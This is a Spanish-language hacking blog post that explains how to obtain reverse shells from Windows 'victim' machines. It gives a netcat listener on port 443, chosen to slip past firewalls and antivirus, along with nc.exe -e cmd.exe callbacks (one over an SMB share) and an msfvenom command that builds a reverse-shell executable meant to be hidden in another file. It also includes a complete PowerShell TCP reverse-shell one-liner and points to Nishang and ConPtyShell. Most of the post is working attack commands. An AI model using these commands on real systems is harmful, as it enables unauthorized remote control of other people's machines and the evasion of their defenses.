---
layout: single
title: Reverse Shells en Windows
excerpt: "En este artículo vamos a ver las formas que hay de mandarnos reverse shells cuando la maquina victima es Windows."
date: 2022-08-26
classes: wide
header:
  teaser: /assets/images/web-hacking/reverse-shell-windows/netcat.PNG
  teaser_home_page: true
  icon: 
categories:
  - Windows
tags:  
  - Windows
  - Reverse shell
---

He hecho este artículo ya que las `reverse shells` en `Windows` son diferentes a Linux y ya que he empezado a aprender Hacking para Windows, ya que en linux ya soy capaz de resolver maquinas sin ayuda pues se me ha ocurrido hacer este post.

# PONERNOS A LA ESCUCHA: 

Lo primero, antes de mandarnos una consola desde la máquina víctima necesitamos un `puerto` donde estemos `a la escucha` para que nos llegue ahí la shell.

Para esto solemos utilizar el puerto `443/tcp`, ya que es un puerto por el cual se transmiten datos en casos de páginas web, ya que es el puerto por el cual suelen correr los servicios `https`. Por lo tanto, los `firewalls y antivirus` `pueden detectar` datos transmitirse por ese puerto, pero `no le dan importancia`, ya que es normal que se manden datos por ahí. Y, por lo tanto, `somos menos detectables`.

Para esto utilizaremos el siguiente `comando` estando en `root`:

```
> nc -nlvp 443
listening on [any] 443 ...
```

## FORMA MEJORADA

Por lo que he estado viendo hay un comando que funciona mejor ya que nos permite utilizar atajos de teclado como `Ctl+L`:

```
> rlwrap nc -nlvp 443
listening on [any] 443 ...
```

# MANDARNOS UNA REVERSE SHELL
## Nc.exe

Este binario es `similar a netcat` en `Linux`, pero este funciona en `Windows`, tanto en 32, como en 64 bits.

Para esto usaremos el siguiente comando:

```
> nc.exe -e cmd.exe <nuestra ip> 443
```

En caso de que no este instalado lo podemos descargar desde: `https://github.com/int0x33/nc.exe/`

Con eso podemos mandarlo en un archivo malicioso y que lo ejecute o que el archivo lo descargue...

Pero también podemos montarnos un servidor `SMB` y utilizarlo desde ahí poniendo el siguiente comando en la máquina Windows:

```
> \\192.168.118.10\pwned\nc.exe -e cmd.exe <ip> <puerto>
```

## Msfvenom

Msfvenom no solo es útil cuando nos generamos `shellcodes` para los `Buffer Overflow`, también lo es para `crear binarios que nos ejecuten una shell en Windows`. En concreto, los dos `payloads que nos pueden interesar` (aunque hay más y de muchos tipos) son los siguientes:

```
> msfvenom -l payloads | grep -i 'windows' | grep -i '/shell_reverse'
windows/shell_reverse/tcp                            Connect back to attacker and spawn a command shell
windows/x64/shell_reverse/tcp                        Connect back to attacker and spawn a command shell (Windows x64)
```

Si la máquina víctima es de `32 bits` usaremos el primero y si es de `64` usaremos el segundo.

Con el siguiente comando creamos un `ejecutable` que si lo ejecutamos en la máquina víctima nos mandará una `reverse shell`. Claro, para eso tendremos que `ocultarlo` dentro de otro archivo, o también podríamos ponerlo en un servidor web hecho con python y que la máquina víctima lo descargue y lo ejecute, pero no me quiero extender mas aquí.

```
> msfvenom -p <payload> LHOST=<ip> LPORT=443 -a x<arquitectura> -f exe -o shell.exe
```

## Powershell Reverse Shell One-Liner

En `Powershell` que es un lenguaje muy potente que maneja `Windows` hay un comando con el que nos podemos mandar una reverse shell con una única linea de codigo:

```
> $client = New-Object System.Net.Sockets.TCPClient("<tu IP>",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

No es muy recomendable utilizar este metodo para obtener acceso desde una `webshell` o desde una `cmd`, pero `es muy util para Rubber Duckys`.

## Nishang

Nishang es un `repositorio` el cual contiene una gran cantidad de `scripts` de powershell usados para la seguridad ofensiva. Su repositorio oficial es el que podéis visitar en este enlace: `https://github.com/samratashok/nishang`

Entre todos los scripts que tiene, `hay uno` en concreto bastante famoso llamado `Invoke-PowerShellTcp.ps1`, el cual, como no, `nos invoca una reverse shell con una powershell`:

![](/assets/images/web-hacking/reverse-shell-windows/script.png)

El script no es más que una `función en powershell`, por lo que tenemos dos opciones:

```
· Descargar y cargar el script de forma local, y posteriormente ejecutar la función con los argumentos para una reverse shell.
· Cargar el script de forma remota y que en la misma acción donde lo carga, posteriormente ejecute la función con los argumentos para la reverse shell, todo en un paso.
```

## ConPtyShell

ConPtyShell es una herramienta la cual `nos permite obtener una shell completamente interactiva` en sistemas Windows. Esto quiere decir que podemos hacer `Ctrl+C` sin peligro a perder la shell o podemos recuperar comandos usados previamente usando la flechita hacia arriba. Su repositorio oficial lo podéis encontrar en este enlace: `https://github.com/antonioCoco/ConPtyShell`

La forma de `ejecutarlo` es la misma que con el script anterior, ya que ambos son scripts en `powershell`.



